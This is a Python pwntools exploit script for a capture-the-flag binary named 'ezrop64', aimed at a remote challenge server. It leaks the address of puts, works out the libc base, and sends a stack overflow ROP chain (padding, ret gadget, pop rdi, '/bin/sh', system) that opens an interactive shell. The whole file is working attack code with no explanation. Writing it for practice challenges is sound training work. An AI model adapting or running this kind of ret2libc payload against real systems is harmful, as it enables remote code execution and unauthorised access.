import time
from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack

# io = remote("192.168.170.128", 9997)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
io = remote("node5.anna.nssctf.cn", 28474)
# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./ezrop64')
# libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

ru("0x")
puts_addr = int(io.recv(12), 16)
print(hex(puts_addr))
libc_base = puts_addr - 0x080ED0

sys_addr = 0x050D60 + libc_base
binsh = 0x01D8698 + libc_base
pop_rdi = 0x00000000004012a3
ret = 0x000000000040101a

payload = b'a' * (0x100 + 8) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys_addr)
ru("Start your rop.")
sl(payload)

inter()